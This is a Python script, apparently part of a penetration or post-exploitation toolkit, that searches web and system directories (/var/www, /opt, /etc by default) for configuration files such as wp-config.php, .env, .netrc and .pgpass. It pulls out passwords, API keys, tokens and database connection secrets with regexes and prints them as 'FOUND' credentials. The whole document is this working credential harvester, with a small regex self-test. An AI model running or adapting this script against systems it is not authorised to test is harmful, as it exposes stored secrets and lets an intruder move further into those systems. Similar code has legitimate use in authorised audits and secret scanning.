#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common

INTERESTING = re.compile(
    r"(wp-config\.php|config\.php|settings\.php|database\.yml|database\.yaml|"
    r"settings\.py|local_settings\.py|prod\.env|\.env|config\.json|"
    r"config\.ini|\.netrc|\.pgpass|connections\.xml|web\.config)$",
    re.IGNORECASE,
)

PATTERNS = [
    re.compile(r"(?i)(?:password|passwd|pwd|pass)\s*[:=]\s*['\"]?([^\s'\";,#]{3,})"),
    re.compile(r"(?i)(?:secret|api[_-]?key|token|auth)\s*[:=]\s*['\"]?([^\s'\";,#]{6,})"),
    re.compile(r"mysql://[^:]+:([^@]+)@"),
    re.compile(r"postgres://[^:]+:([^@]+)@"),
    re.compile(r"^([^:\s]+):([^:\s]+)$"),
]

MAX_FILE = 2 * 1024 * 1024

def looks_real(value: str) -> bool:
    v = value.strip().strip("'\"")
    if len(v) < 4 or len(v) > 128:
        return False
    low = v.lower()
    if low in {"true", "false", "null", "none", "password", "changeme", "xxxxx"}:
        return False
    if v.startswith("${") or "{{" in v:
        return False
    return True

def scan_file(path: str, found: set[str]) -> None:
    try:
        with open(path, "r", errors="replace") as fh:
            data = fh.read(MAX_FILE + 1)
    except OSError:
        return
    for pat in PATTERNS:
        for m in pat.finditer(data):

            val = None
            for g in reversed(m.groups()):
                if g:
                    val = g
                    break
            if val and looks_real(val):
                found.add(val.strip().strip("'\""))

def walk(roots: list[str]) -> set[str]:
    found: set[str] = set()
    for root in roots:
        for dirpath, _dirs, files in os.walk(root):
            for name in files:
                if not INTERESTING.search(name):
                    continue
                scan_file(os.path.join(dirpath, name), found)
    return found

def main() -> int:
    if "--selftest" in sys.argv:
        common.info("harvest.py selftest OK")

        sample = "DB_PASSWORD=hunter2\napi_key: AKIAEXAMPLE123456\n"
        hits = set()
        for pat in PATTERNS:
            for m in pat.finditer(sample):
                for g in reversed(m.groups()):
                    if g and looks_real(g):
                        hits.add(g.strip().strip("'\""))
                        break
        assert "hunter2" in hits, hits
        common.good(f"regex sanity OK: {hits}")
        return 0

    roots = []
    for i, a in enumerate(sys.argv):
        if a == "--dirs" and i + 1 < len(sys.argv):
            roots = sys.argv[i + 1].split()
    if not roots:
        roots = ["/var/www", "/opt", "/etc"]
    common.info(f"harvesting credentials under {roots}")
    found = walk(roots)
    for pw in sorted(found):
        print(f"FOUND: {pw}")
    common.info(f"{len(found)} unique credential candidate(s)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
